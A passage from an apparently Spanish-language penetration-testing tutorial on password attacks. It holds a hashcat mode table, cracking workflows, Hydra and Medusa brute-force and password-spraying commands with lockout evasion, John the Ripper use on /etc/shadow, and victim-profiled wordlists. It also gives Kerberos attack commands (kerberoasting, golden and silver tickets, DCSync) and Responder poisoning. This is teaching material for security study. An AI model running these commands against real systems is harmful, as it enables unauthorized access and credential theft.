| 9700 | MS Office <= 2003 $0/$1 | 32 hex | `hash` |
| 9710 | MS Office <= 2003 $0/$1 (MD5+RC4) | 32 hex | `hash` |
| 9720 | MS Office <= 2003 $3 (SHA1+RC4) | 40 hex | `hash` |
| 9800 | MS Office 2007 | variable | `hash` |
| 9810 | MS Office 2010 | variable | `hash` |
| 9820 | MS Office 2013 | variable | `hash` |
| 9900 | Radmin2 | 32 hex | `hash` |
| 10000 | Django (PBKDF2-SHA256) | variable | `pbkdf2_sha256$...` |
| 10100 | SipHash | variable | `hash` |
| 10200 | CRAM-MD5 | 32 hex | `hash` |
| 10300 | SAP CODVN H (PWDSALTEDHASH) | variable | `hash` |
| 10400 | PDF 1.1-1.3 (Acrobat 2-4) | variable | `hash` |
| 10410 | PDF 1.1-1.3 (Acrobat 2-4) + coll | variable | `hash` |
| 10420 | PDF 1.4-1.6 (Acrobat 5-8) | variable | `hash` |
| 10500 | PDF 1.7 Level 3 (Acrobat 9) | variable | `hash` |
| 10600 | PDF 1.7 Level 8 (Acrobat X) | variable | `hash` |
| 10700 | PDF 1.7 Level 8 (Acrobat XI-XV) | variable | `hash` |
| 10800 | SHA256($pass.$salt) + HMAC | variable | `hash` |
| 10900 | PBKDF2-HMAC-SHA256 | variable | `hash:salt:iterations` |
| 11000 | PrestaShop | variable | `hash` |
| 11100 | PostgreSQL | variable | `hash` |
| 11200 | MySQL 5.x (SHA1) | 40 hex | `*hash` |
| 11300 | Bitcoin/Litecoin wallet.dat | variable | `hash` |
| 11400 | SIP digest | variable | `hash` |
| 11500 | CRC32 | 8 hex | `hash` |
| 11600 | 7-Zip | 66 hex | `$7z$...` |
| 11700 | GOST R 34.11-2012 (Streebog) | 128 hex | `hash` |
| 11800 | Electrum Wallet (1-5) | 48 hex | `hash` |
| 11900 | PBKDF2-HMAC-MD5 | variable | `hash:salt:iterations` |
| 12000 | PBKDF2-HMAC-SHA1 | variable | `hash:salt:iterations` |
| 12100 | PBKDF2-HMAC-SHA512 | variable | `hash:salt:iterations` |
| 12200 | Ethereum Wallet (SCRYPT) | variable | `hash` |
| 12300 | Ethereum Pre-Sale Wallet | variable | `hash` |
| 12400 | BSDi Crypt | variable | `hash` |
| 12500 | RAR3-hp | 28 hex | `$RAR3$...` |
| 12600 | RAR5 | 130 hex | `$rar5$...` |
| 12700 | [blockchain](../raw/w3b3-sm4rt-c0ntr4cts.md#blockchain).[com](../raw/w1n-s9bsyst3ms.md#com) Wallet | variable | `hash` |
| 12800 | MS-AzureSync | 32 hex | `hash` |
| 12900 | Android FDE (Samsung) | variable | `hash` |
| 13000 | RAKP HMAC-SHA1 | variable | `hash` |
| 13100 | Kerberos 5 TGS-REP | variable | `$krb5tgs$23$...` |
| 13200 | Kerberos 5 TGS-REP ([aes](../raw/crypt0-f0r-h4ck3rs.md#aes)) | variable | `$krb5tgs$18$...` |
| 13300 | Kerberos 5 AS-REP (AES) | variable | `$krb5asrep$18$...` |
| 13400 | KeePass 1/2 | 4 char | `$keepass$...` |
| 13500 | PeopleSoft | 32 hex | `hash` |
| 13600 | Windows 8+ phone | variable | `hash` |
| 13700 | Veracrypt SHA512 + XTS | variable | `hash` |
| 13711 | Veracrypt SHA512 + XTS 64 | variable | `hash` |
| 13712 | Veracrypt SHA512 + XTS 132 | variable | `hash` |
| 13721 | Veracrypt Whirlpool + XTS | variable | `hash` |
| 13731 | Veracrypt SHA256 + XTS | variable | `hash` |
| 13751 | Veracrypt RIPEMD160 + XTS | variable | `hash` |
| 13761 | Veracrypt Twofish + XTS | variable | `hash` |
| 13771 | Veracrypt Serpent + XTS | variable | `hash` |
| 13781 | Veracrypt Camellia + XTS | variable | `hash` |
| 13791 | Veracrypt Kuznyechik + XTS | variable | `hash` |
| 13800 | Windows Phone 8+ | variable | `hash` |
| 13900 | OpenCart | variable | `hash` |
| 14000 | DES (PT = $salt, key = $pass) | variable | `hash` |
| 14100 | 3DES (PT = $salt, key = $pass) | variable | `hash` |
| 14400 | sha1(CX) | 40 hex | `hash` |
| 14600 | MySQL 5.x (SHA256) | variable | `hash` |
| 14700 | iTunes Backup >= 10.0 | variable | `hash` |
| 14800 | iTunes Backup < 10.0 | variable | `hash` |
| 14900 | Skip32 | 8 hex | `hash` |
| 15000 | FileZilla Server >= 0.9.55 | variable | `hash` |
| 15100 | FileZilla Server >= 0.9.60 | variable | `hash` |
| 15200 | Blockchain.com Wallet (V2) | variable | `hash` |
| 15300 | DPAPI v1 | variable | `hash` |
| 15310 | DPAPI v2 | variable | `hash` |
| 15400 | Chrome 74+ | variable | `hash` |
| 15500 | NetNTLMv1 + ESS | variable | `hash` |
| 15600 | NetNTLMv2 + ESS | variable | `hash` |
| 15700 | Ethereum Wallet (PBKDF2-HMAC-SHA256) | variable | `hash` |
| 15900 | DPAPI v1 (domain key) | variable | `hash` |
| 16000 | Tripcode | 10 chars | `hash` |
| 16100 | TOTP | 16 hex | `hash` |
| 16200 | Apache $apr1$ | 37 chars | `$apr1$salt$hash` |
| 16300 | Ethereum Pre-Sale Wallet (PBKDF2-HMAC-SHA256) | variable | `hash` |
| 16400 | Chromium 80+ | variable | `hash` |
| 16500 | [jwt](../raw/4p1-s3cur1ty.md#jwt) (JSON Web Token) | variable | `hash` |
| 16600 | Electrum Wallet (v2) | variable | `hash` |
| 16700 | FileZilla Server >= 1.2.0 | variable | `hash` |
| 16800 | WPA-PMKID-PBKDF2 | variable | `hash` |
| 16900 | WPA-PMKID-PMK | variable | `hash` |
| 17200 | PKZIP (Compressed) | variable | `hash` |
| 17210 | PKZIP (Uncompressed) | variable | `hash` |
| 17220 | PKZIP (Compressed Multi-File) | variable | `hash` |
| 17225 | PKZIP (Mixed Multi-File) | variable | `hash` |
| 17230 | PKZIP (Uncompressed Multi-File) | variable | `hash` |
| 17300 | SHA3-256 | 64 hex | `hash` |
| 17400 | SHA3-512 | 128 hex | `hash` |
| 17500 | SHA3-224 | 56 hex | `hash` |
| 17600 | SHA3-384 | 96 hex | `hash` |
| 17700 | Keccak-224 | 56 hex | `hash` |
| 17800 | Keccak-256 | 64 hex | `hash` |
| 17900 | Keccak-384 | 96 hex | `hash` |
| 18000 | Keccak-512 | 128 hex | `hash` |
| 18100 | TOTP (SHA1) | variable | `hash` |
| 18200 | Kerberos 5 AS-REP | variable | `$krb5asrep$23$...` |
| 18300 | Apple File System (APFS) | variable | `hash` |
| 18400 | Document Foundation ODF | variable | `hash` |
| 18500 | sha256(md5($pass)) | 64 hex | `hash` |
| 18600 | sha1($pass.$salt) + HMAC | variable | `hash` |
| 18700 | sha512($pass.$salt) + HMAC | variable | `hash` |
| 18800 | Blockchain.com Wallet (V2) | variable | `hash` |
| 18900 | Android Backup | variable | `hash` |
| 19000 | PostgreSQL SCRAM-SHA-256 | variable | `hash` |
| 19100 | Office 2016 - SheetX | variable | `hash` |
| 19200 | Office 2016 - SheetX (SHA256) | variable | `hash` |
| 19300 | Office 2016 - SheetX (SHA512) | variable | `hash` |
| 19400 | Office 2016 - SheetX (Whirlpool) | variable | `hash` |
| 19500 | Ruby on Rails Restful Auth | variable | `hash` |
| 19600 | Kerberos 5 TGS-REP (AES) | variable | `hash` |
| 19700 | Kerberos 5 AS-REP (AES) | variable | `hash` |
| 19800 | Kerberos 5 TGS-REP (RC4) | variable | `hash` |
| 19900 | Kerberos 5 AS-REP (RC4) | variable | `hash` |
| 20000 | SHA256(unicode($pass)) | 64 hex | `hash` |
| 20100 | SHA512(unicode($pass)) | 128 hex | `hash` |
| 20200 | [python](../raw/pyth0n-f0r-h4ck1ng.md) passlib pbkdf2-sha256 | variable | `hash` |
| 20300 | Python passlib pbkdf2-sha512 | variable | `hash` |
| 20400 | Python passlib bcrypt | 60 chars | `$2b$...` |
| 20500 | Python passlib pbkdf2-sha1 | variable | `hash` |
| 20600 | Oracle 11g/12c | variable | `hash` |
| 20700 | MySQL 8.x | variable | `hash` |
| 20800 | sha256(md5($pass.$salt)) | 64 hex | `hash` |
| 20900 | md5(sha1($pass).$salt) | variable | `hash` |
| 21000 | Bitwarden | variable | `hash` |
| 21100 | sha256($salt.$pass.$salt) | 64 hex | `hash` |
| 21200 | sha512($salt.$pass.$salt) | 128 hex | `hash` |
| 21300 | md5($salt.$pass.$salt) | 32 hex | `hash` |
| 21400 | sha256($salt.sha256($pass)) | 64 hex | `hash` |
| 21500 | sha512($salt.sha512($pass)) | 128 hex | `hash` |
| 21600 | [web3](../raw/w3b3-sm4rt-c0ntr4cts.md) Secret Storage | variable | `hash` |
| 21700 | Electrum Wallet (v3) | variable | `hash` |
| 21800 | sha512($salt.unicode($pass)) | 128 hex | `hash` |
| 21900 | md5($salt.unicode($pass)) | 32 hex | `hash` |
| 22000 | WPA-PBKDF2-PMKID+EAPOL | variable | `.hc22000` |
| 22001 | WPA-PMK-PMKID+EAPOL | variable | `.hc22000` |
| 22100 | BitLocker | variable | `$bitlocker$...` |
| 22200 | Citrix NetScaler (SHA256) | 64 hex | `hash` |
| 22300 | sha256($salt.$pass) + CRC | 64 hex | `hash` |
| 22400 | AES Crypt SHA256 | variable | `hash` |
| 22500 | Apple Keychain (iOS) | variable | `hash` |
| 22600 | Telegram Desktop < 2.1.14 | variable | `hash` |
| 22700 | MultiBit HD | variable | `hash` |
| 22800 | sha256($salt.$pass.$salt) + CRC | 64 hex | `hash` |
| 22900 | sha512($salt.$pass.$salt) + CRC | 128 hex | `hash` |
| 23000 | sha1($salt.$pass.$salt) + CRC | 40 hex | `hash` |
| 23100 | md5($salt.$pass.$salt) + CRC | 32 hex | `hash` |
| 23200 | macOS v10.15+ (PBKDF2-SHA512) | variable | `hash` |
| 23300 | Apple iWork | variable | `hash` |
| 23400 | sha256($pass) + HMAC | 64 hex | `hash` |
| 23500 | sha512($pass) + HMAC | 128 hex | `hash` |
| 23600 | sha1($pass) + HMAC | 40 hex | `hash` |
| 23700 | md5($pass) + HMAC | 32 hex | `hash` |
| 23800 | sha256(unicode($pass)) + HMAC | 64 hex | `hash` |
| 23900 | sha512(unicode($pass)) + HMAC | 128 hex | `hash` |
| 24000 | sha1(unicode($pass)) + HMAC | 40 hex | `hash` |
| 24100 | md5(unicode($pass)) + HMAC | 32 hex | `hash` |
| 24200 | SQLite 3 | variable | `hash` |
| 24300 | sha256($salt.sha256($pass)) | 64 hex | `hash` |
| 24400 | sha512($salt.sha512($pass)) | 128 hex | `hash` |
| 24500 | md5($salt.md5($pass)) | 32 hex | `hash` |
| 24600 | sha1($salt.sha1($pass)) | 40 hex | `hash` |
| 24700 | sha256($salt.sha256($salt.$pass)) | 64 hex | `hash` |
| 24800 | sha512($salt.sha512($salt.$pass)) | 128 hex | `hash` |
| 24900 | md5($salt.md5($salt.$pass)) | 32 hex | `hash` |
| 25000 | sha1($salt.sha1($salt.$pass)) | 40 hex | `hash` |
| 25100 | sha256($salt.sha256($pass.$salt)) | 64 hex | `hash` |
| 25200 | sha512($salt.sha512($pass.$salt)) | 128 hex | `hash` |
| 25300 | md5($salt.md5($pass.$salt)) | 32 hex | `hash` |
| 25400 | sha1($salt.sha1($pass.$salt)) | 40 hex | `hash` |
| 25500 | Stellar Wallet (SHA256) | variable | `hash` |
| 25600 | bcrypt(md5($pass)) | 60 chars | `$2a$...` |
| 25700 | bcrypt(sha1($pass)) | 60 chars | `$2a$...` |
| 25800 | bcrypt(sha256($pass)) | 60 chars | `$2a$...` |
| 25900 | bcrypt(sha512($pass)) | 60 chars | `$2a$...` |
| 26000 | Litecoin Wallet | variable | `hash` |
| 26100 | Mozilla Master Password | variable | `hash` |
| 26200 | OpenPGP | variable | `hash` |
| 26300 | LastPass (Vault) | variable | `hash` |
| 26400 | AES-256-CCM | variable | `hash` |
| 26500 | [iphone](../raw/10s-p3nt3st1ng.md) Passcode | variable | `hash` |

### 1.9 Práctica: Workflow Típico

```bash
# 1. Identificar hashes
hashid hashes.txt

# 2. Empezar con dictionary + reglas best64 (rápido)
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r rules/best64.rule -O -w 3

# 3. Si no funciona, probar dive.rule (exhaustivo)
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r rules/dive.rule -O -w 3

# 4. Mask attack si sabés formato
hashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?l?l?l?l?d?d  # Capital + lower + 2 digits

# 5. Combinator (palabra + palabra)
hashcat -m 1000 -a 1 hashes.txt rockyou.txt rockyou.txt

# 6. Hybrid (palabra + año)
hashcat -m 1000 -a 6 hashes.txt rockyou.txt 202?d

# 7. Ver resultados crackeados
hashcat -m 1000 --show hashes.txt

# 8. Ver resultados que no se crackearon
hashcat -m 1000 --left hashes.txt
```

### 1.10 Errores Comunes y Soluciones

```bash
# Error: * OpenCL: No devices found
hashcat -I    # Ver dispositivos
# Solución: Instalar drivers de GPU / instalar OpenCL

# Error: Token length exception
# El formato del hash no es correcto
# Revisá que tenga la longitud y estructura esperada

# Error: Hashfile '...' on line 1: Salt value exception
# El salt no tiene el formato correcto
# Ej: hash:salt (sin espacios)

# Error: Separator unmatched
# Usá : como separador, no espacios ni otros caracteres

# Fatemal Error: Illegally placed operator
# Problema con la sintaxis de la máscara o regla

# * Hash mode 1000 was selected, but hash is too short
# Un hash NTLM debe tener 32 caracteres hex
# MD5 también tiene 32 pero el modo es 0, no 1000

# Slow performance on bcrypt
hashcat -m 3200 -w 4 -O hashes.txt rockyou.txt
# bcrypt es intencionalmente lento, aceptalo o usá CPU con threads
```

---

## 2. [hydra](../raw/p4ssw0rd-4tt4cks.md#hydra) — Password Spraying Online

Hydra es la herramienta por excelencia para ataques de [fuerza bruta](../raw/p4ssw0rd-4tt4cks.md#fuerza-bruta) a servicios de [red](../raw/r3d3s-f0nd4m3nt0s.md).

### 2.1 Protocolos Soportados

```bash
# SSH
hydra -l admin -P passwords.txt ssh://192.168.1.100
hydra -L users.txt -P passwords.txt ssh://192.168.1.100
hydra -l admin -p password ssh://192.168.1.100  # Un solo user y pass

# FTP
hydra -l anonymous -P passwords.txt ftp://192.168.1.100
hydra -L users.txt -P passwords.txt ftp://192.168.1.100 -vV

# HTTP Basic Auth
hydra -l admin -P passwords.txt http-get://192.168.1.100/admin/
hydra -L users.txt -P passwords.txt http-get://192.168.1.100/secure/

# HTTP POST Form (login)
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
# ^USER^ y ^PASS^ son reemplazados por el user/pass actual
# F=incorrect indica que "incorrect" en la respuesta = fallo

# HTTP POST con múltiples condiciones
hydra -L users.txt -P passwords.txt target.com http-post-form \
  "/login:username=^USER^&password=^PASS^&submit=Login:bad password"

# HTTPS POST
hydra -l admin -P passwords.txt -m /login https-post://192.168.1.100

# MySQL
hydra -l root -P passwords.txt mysql://192.168.1.100
hydra -l root -P passwords.txt mysql://192.168.1.100 -s 3307  # Puerto custom

# PostgreSQL
hydra -l postgres -P passwords.txt postgres://192.168.1.100

# MSSQL
hydra -l sa -P passwords.txt mssql://192.168.1.100

# RDP
hydra -l administrator -P passwords.txt rdp://192.168.1.100
hydra -l administrator -P passwords.txt rdp://192.168.1.100 -V

# SMB
hydra -l administrator -P passwords.txt smb://192.168.1.100
hydra -L users.txt -P passwords.txt smb://192.168.1.100

# LDAP
hydra -l cn=admin,dc=domain,dc=com -P passwords.txt ldap://192.168.1.100

# POP3
hydra -l user@domain.com -P passwords.txt pop3://mail.domain.com

# IMAP
hydra -l user -P passwords.txt imap://mail.domain.com

# SMTP
hydra -l user@domain.com -P passwords.txt smtp://mail.domain.com

# VNC
hydra -P passwords.txt vnc://192.168.1.100

# Telnet
hydra -l admin -P passwords.txt telnet://192.168.1.100

# SNMP
hydra -P passwords.txt snmp://192.168.1.100

# Redis
hydra -P passwords.txt redis://192.168.1.100

# Cisco enable
hydra -l enable -P passwords.txt cisco://192.168.1.100
```

### 2.2 Flags Importantes

```bash
# -t: threads (default 16)
hydra -l admin -P passwords.txt -t 4 ssh://192.168.1.100

# -V: verbose (ver cada intento)
hydra -l admin -P passwords.txt -t 4 -V ssh://192.168.1.100

# -f: stop al primer éxito
hydra -l admin -P passwords.txt -t 4 -f ssh://192.168.1.100

# -F: stop cuando todos los usuarios tengan un éxito
hydra -L users.txt -P passwords.txt -F ssh://192.168.1.100

# -s: puerto custom
hydra -l admin -P passwords.txt -s 2222 ssh://192.168.1.100

# -e ns: probar null password y mismo user como password
hydra -l admin -e ns ssh://192.168.1.100

# -o: output a archivo
hydra -l admin -P passwords.txt -o results.txt ssh://192.168.1.100

# -w: wait entre intentos (segundos)
hydra -l admin -P passwords.txt -w 3 ssh://192.168.1.100

# -W: connection timeout
hydra -l admin -P passwords.txt -W 30 ssh://192.168.1.100
```

### 2.3 Password Spraying Estratégico

La idea es no hacer fuerza bruta a un solo usuario (que genera bloqueos), sino probar una contraseña común contra muchos usuarios:

```bash
# Probar "Passw0rd!" contra todos los usuarios
hydra -L users.txt -p "Passw0rd!" ssh://192.168.1.100

# Probar 3 contraseñas comunes contra muchos usuarios
for pass in "Passw0rd!" "Admin123!" "Spring2024!"; do
  hydra -L users.txt -p "$pass" -f ssh://192.168.1.100
done

# Con delays entre tandas para evitar bloqueos
for pass in $(cat common_passwords.txt); do
  echo "Probando: $pass"
  hydra -L users.txt -p "$pass" -t 2 -f ssh://192.168.1.100
  sleep 30
done
```

### 2.4 Medusa (Alternativa a Hydra)

Medusa es más estable que Hydra en algunos escenarios:

```bash
# SSH
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh

# HTTP form
medusa -h 192.168.1.100 -u admin -P passwords.txt -M http \
  -m DIR:/login -m FORM:"user=^USER^&pass=^PASS^" -m DENY_SIGNAL:"incorrect"

# FTP
medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ftp

# MySQL
medusa -h 192.168.1.100 -u root -P passwords.txt -M mysql

# Flags útiles
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh -t 5 -f -V
# -t: threads, -f: stop on first, -V: verbose
```

---

## 3. [john the ripper](../raw/p4ssw0rd-4tt4cks.md#john-the-ripper)

[john](../raw/p4ssw0rd-4tt4cks.md#john-the-ripper) es más lento que [hashcat](../raw/p4ssw0rd-4tt4cks.md#hashcat) pero tiene mejor soporte para formatos de [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions) complejos y reglas avanzadas.

### 3.1 Uso Básico

```bash
# Extraer hashes shadow (Linux)
unshadow /etc/passwd /etc/shadow > hashes.txt

# Crackear con wordlist
john hashes.txt --wordlist=rockyou.txt

# Mostrar resultados
john --show hashes.txt

# Ver qué usuarios ya se crackearon
john --show --users=all hashes.txt

# Cracking solo con reglas
john --wordlist=rockyou.txt --rules hashes.txt

# Incremental (brute-force)
john --incremental hashes.txt

# Especificar formato
john --format=raw-md5 hashes.txt --wordlist=rockyou.txt
john --format=nt hashes.txt --wordlist=rockyou.txt
john --format=bcrypt hashes.txt --wordlist=rockyou.txt
```

### 3.2 Formatos Soportados

```bash
# Listar todos los formatos
john --list=formats

# Listar formatos por categoría
john --list=formats | grep -i nt
john --list=formats | grep -i md5
john --list=formats | grep -i krb
```

### 3.3 Korelogic Rules

John tiene sets de reglas muy potentes. Los de Korelogic son los mejores:

```bash
# Usar reglas Korelogic (incluidas en john.conf)
john --wordlist=rockyou.txt --rules=KoreLogic rules hashes.txt
john --wordlist=rockyou.txt --rules=KoreLogicRulesPrependSeason hashes.txt
john --wordlist=rockyou.txt --rules=KoreLogicRulesAppendNum_1 hashes.txt

# Las reglas KoreLogic incluyen:
# - Prepend seasons: Summer2024, Winter2024, etc.
# - Append years: password2024, password2023
# - Leet speak: p@ssw0rd
# - Capitalize + number: Password1, Password123
# - Y muchas más combinaciones

# Listar todas las reglas disponibles
john --list=rules
```

### 3.4 Reglas Custom en John

Se configuran en `john.conf` (o `john.ini` en Windows):

```bash
# Agregar al final de john.conf:
[List.Rules:CustomRules]
# Agregar números al final
$[0-9]$[0-9]$[0-9]
# Capitalizar
c
# Agregar año
$2$0$2$4
# Combinación: capitalize + año
c $2$0$2$4
# Leet: reemplazar
sa@s0o$ $ $ $   # space-separated: s a @  s 0 o  s $ $
# Append special char
s $ $ $ ! $ @ $ # $ $ $ %
```

### 3.5 [cracking](../raw/p4ssw0rd-4tt4cks.md#cracking-de-contrasenas) con Sesión

```bash
# Iniciar sesión (pausable con Ctrl+C)
john --session=sesion1 hashes.txt --wordlist=rockyou.txt

# Reanudar sesión
john --restore=sesion1

# Status de una sesión
john --status=sesion1
```

---

## 4. Wordlists y Generación Custom

### 4.1 Descarga de Wordlists Populares

```bash
# RockYou (obligatorio, ~14GB)
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
# Versión comprimida:
wget https://github.com/praetorian-code/Hob0Rules/raw/master/rockyou.txt.gz
gunzip rockyou.txt.gz

# SecLists (colección masiva)
git clone --depth 1 https://github.com/danielmiessler/SecLists
# Contiene: Passwords/, Usernames/, Discovery/, etc.

# Probable-Wordlists (basadas en estadísticas)
git clone https://github.com/berzerk0/Probable-Wordlists
# Contiene listas ordenadas por probabilidad

# WeakPass (contraseñas débiles conocidas)
git clone https://github.com/berzerk0/Weakpass

# CrackStation (diccionarios pre-computados)
# https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm

# FuzzDB
git clone https://github.com/fuzzdb-project/fuzzdb
```

### 4.2 Generación con crunch

Crunch genera wordlists con patrones específicos:

```bash
# Min 8, max 10, solo dígitos
crunch 8 10 0123456789 -o pinlist.txt

# Solo letras minúsculas, 6 chars
crunch 6 6 abcdefghijklmnopqrstuvwxyz -o words6.txt

# Con charset predefined
crunch 4 6 -f /usr/share/crunch/charset.lst mixalpha -o output.txt

# Patrón: @ = lowercase, % = digit
crunch 8 8 -t Password%% -o passwords_with_digits.txt
crunch 10 10 -t Pass@@@@%% -o custom_list.txt

# Sin archivo (directo a hashcat via pipe)
crunch 8 8 0123456789 | hashcat -m 0 -a 0 hashes.txt

# Con límite de tamaño de archivo
crunch 8 12 abcdefghijklmnopqrstuvwxyz -o output.txt -c 100MB

# Con progreso
crunch 8 8 abcdefghijklmnopqrstuvwxyz -o output.txt -z gzip
```

### 4.3 Generación con kwprocessor (Keyboard Walks)

Genera contraseñas basadas en patrones de teclado:

```bash
# Base chars (teclas en orden)
kwp -o patterns.txt basechars/full.base

# Con límite de longitud
kwp -o patterns.txt basechars/full.base --keywalk-max-len 8

# Solo patrones de 4 teclas
kwp -o patterns.txt basechars/full.base --keywalk-len 4

# Con límite de resultados
kwp -o patterns.txt basechars/full.base --limit 10000
```

### 4.4 Generación con cupp (Common User Password Profiler)

Cupp genera wordlists basadas en información personal de la víctima:

```bash
# Modo interactivo
cupp -i

# Te va preguntando:
# [+] Enter the name of the victim: juan
# [+] Enter the surname: perez
# [+] Enter the wife's name: maria
# [+] Enter the children's names: pedro
# [+] Enter the pet's name: firulais
# [+] Enter the company name: acme
# ...
# Genera: juan.txt con combinaciones como Juan2024, Juan123, Maria, Firulais, etc.

# También descarga wordlists comunes
cupp -l
```

### 4.5 Generación con mentalist (GUI)

Mentalist tiene interfaz gráfica para generar configuraciones de [hashcat](../raw/p4ssw0rd-4tt4cks.md#hashcat)/[john](../raw/p4ssw0rd-4tt4cks.md#john-the-ripper):

```bash
# Ejecutar (Windows/Linux con GUI)
mentalist

# Podés configurar:
# - Base words
# - Reglas a aplicar
# - Substitutions (leet)
# - Case mangling
# - Append/prepend numbers/symbols

# Exportar como hashcat mask o regla
```

### 4.6 Combinar Wordlists

```bash
# Unir varios archivos
cat list1.txt list2.txt list3.txt > combined.txt

# Ordenar y deduplicar
sort -u combined.txt > deduped.txt

# Quitar líneas menores a N chars
awk 'length >= 8' rockyou.txt > filtered.txt

# Tomar solo las primeras N líneas
head -n 10000 rockyou.txt > top10000.txt

# Split por tamaño
split -l 1000000 rockyou.txt rockyou_chunk_

# Merge con formato específico
paste -d '' list1.txt list2.txt > merged.txt  # Combinar línea por línea
```

---

## 5. Kerberos Attacks ([active directory](../raw/w1nd0ws-d0m41n-4dm1n.md))

### 5.1 [as-rep roasting](../raw/w1nd0ws-d0m41n-4dm1n.md#as-rep-roasting)

Usuarios que tienen "Do not require Kerberos preauthentication" habilitado son vulnerables. Podés obtener su [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions) TGT sin conocer la contraseña:

```bash
# Encontrar usuarios sin preauth
impacket-GetNPUsers -dc-ip 192.168.1.100 dominio.com/ -usersfile users.txt
impacket-GetNPUsers -dc-ip 192.168.1.100 dominio.com/ -request -format hashcat

# Con credenciales de dominio
impacket-GetNPUsers -dc-ip 192.168.1.100 -request dominio.com/admin:Pass123

# Crackear AS-REP hash (modo 18200)
hashcat -m 18200 asrep_hash.txt rockyou.txt

# Con bloodhound: buscar usuarios con "DontReqPreAuth"
```

### 5.2 [kerberoasting](../raw/w1nd0ws-d0m41n-4dm1n.md#kerberoasting)

Pedís tickets TGS para cuentas con Service Principal Names (SPNs). El ticket está [cifrado](../raw/s3c-f0nd4m3nt0s.md#cifrado) con la contraseña de la cuenta de servicio:

```bash
# Kerberoasting sin credenciales
impacket-GetUserSPNs -dc-ip 192.168.1.100 dominio.com/user:password -request

# Con credenciales
impacket-GetUserSPNs dominio.com/user:password -dc-ip 192.168.1.100 -request -outputfile hashes.txt

# Kerberoasting desde Linux con impacket
impacket-GetUserSPNs -dc-ip 192.168.1.100 DOMINIO.COM/usuario:password -request

# Desde Windows con PowerShell
# Set-ExecutionPolicy Unrestricted -Scope Process
# . .\PowerView.ps1
# Request-SPNTicket -User usuario

# Crackear TGS (modo 13100)
hashcat -m 13100 kerberos_tgs.txt rockyou.txt

# Kerberoasting con RC4 (más fácil de crackear)
impacket-GetUserSPNs -dc-ip 192.168.1.100 DOMINIO.COM/user:pass -request -request-user SPN_USER

# Kerberoasting de todos los usuarios con SPN
Set-ADObject -Identity "CN=sql,CN=Users,DC=dominio,DC=com" -ServicePrincipalNames @{Add="MSSQLSvc/sql.dominio.com:1433"}
```

### 5.3 [golden ticket](../raw/w1nd0ws-d0m41n-4dm1n.md#golden-ticket) Attack

Creás un TGT falso con el hash KRBTGT, lo que te da acceso a TODO el dominio:

```bash
# 1. Obtener el hash KRBTGT (necesitás admin en un DC)
# Con Mimikatz en el Domain Controller:
mimikatz # lsadump::lsa /patch /user:krbtgt

# 2. Crear el Golden Ticket
mimikatz # kerberos::golden /user:Administrador /domain:dominio.com /sid:S-1-5-21-123456789-0123456789-1234567890 /krbtgt:HASH_KRBTGT /id:500 /ptt

# 3. Verificar acceso
klist
dir \\DC.dominio.com\c$

# Con impacket (desde Linux):
impacket-ticketer -nthashes HASH_KRBTGT -domain-sid S-1-5-21-... -domain dominio.com Administrator
export KRB5CCNAME=Administrador.ccache
impacket-psexec -k -no-pass dominio.com/admin@DC.dominio.com

# Variantes del Golden Ticket:
# Agregar grupos extra (Domain Admins, Enterprise Admins)
/ groups:512,518,519

# Modificar duración (por defecto 10 años)
/ endin:365  # Días
```

### 5.4 [silver ticket](../raw/w1nd0ws-d0m41n-4dm1n.md#silver-ticket) Attack

Creás un ticket TGS falso para un servicio específico. Más limitado que Golden pero más sigiloso:

```bash
# 1. Obtener hash de la cuenta de servicio (ej: CIFS para SMB)
# Con Mimikatz:
mimikatz # lsadump::lsa /patch /user:DC$

# 2. Crear Silver Ticket para el servicio
mimikatz # kerberos::golden /user:Administrador /domain:dominio.com /sid:S-1-5-21-123456789 /target:DC.dominio.com /service:CIFS /rc4:HASH_SERVICE /ptt

# Servicios comunes:
# CIFS:   Acceso a archivos compartidos
# HTTP:   Acceso IIS/web
# HOST:   Schedule tasks, WMI, etc.
# MSSQLSvc: Acceso SQL Server
# LDAP:   Consultas LDAP
# RPCSS:  RPC
# WSMan:  WinRM

# Verificar
dir \\DC.dominio.com\c$

# Con impacket desde Linux:
impacket-ticketer -nthashes HASH_SERVICE -domain-sid S-1-5-21-... -domain dominio.com -spn CIFS/DC.dominio.com Administrator
```

### 5.5 [dcsync](../raw/w1nd0ws-d0m41n-4dm1n.md#dcsync) Attack

Simulás ser un [domain controller](../raw/w1nd0ws-d0m41n-4dm1n.md#domain-controller) y pedís replicación de contraseñas. Necesitás [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) de replicación (Domain/Enterprise Admins o similar):

```bash
# Mimikatz (ejecutando como admin en máquina unida al dominio)
mimikatz # lsadump::dcsync /domain:dominio.com /user:Administrador
mimikatz # lsadump::dcsync /domain:dominio.com /user:krbtgt

# Dump de todos los usuarios
mimikatz # lsadump::dcsync /domain:dominio.com /all /csv

# Con impacket desde Linux
impacket-secretsdump -just-dc-user Administrador dominio.com/admin:Pass123@192.168.1.100
impacket-secretsdump -just-dc dominio.com/admin:Pass123@192.168.1.100

# Dump completo del dominio
impacket-secretsdump dominio.com/admin:Pass123@192.168.1.100

# Con hashes en vez de password
impacket-secretsdump -hashes LMHASH:NTHASH dominio.com/admin@192.168.1.100
```

---

## 6. [responder](../raw/w1nd0ws-p0st3xpl01t.md#responder) + ntlmrelayx (Captura en [red](../raw/r3d3s-f0nd4m3nt0s.md) Local)

### 6.1 Captura de Hashes con Responder

Responder envenena [llmnr](../raw/w1nd0ws-p0st3xpl01t.md#llmnr-nbt-ns)/[nbt-ns](../raw/w1nd0ws-p0st3xpl01t.md#llmnr-nbt-ns)/mDNS en la red local para capturar hashes NetNTLMv2:

```bash
# Iniciar Responder en interfaz de red
responder -I eth0
responder -I eth0 -wrf  # Habilitar WPAD, wpad, y Force

# Modo análisis (no envenena, solo escucha)
responder -I eth0 -A

# Opciones útiles:
# -w: WPAD rogue proxy
# -r: Force autenticación (responde a HTTP requests)
# -f: Fingerprint (muestra info del sistema)
# -v: Verbose

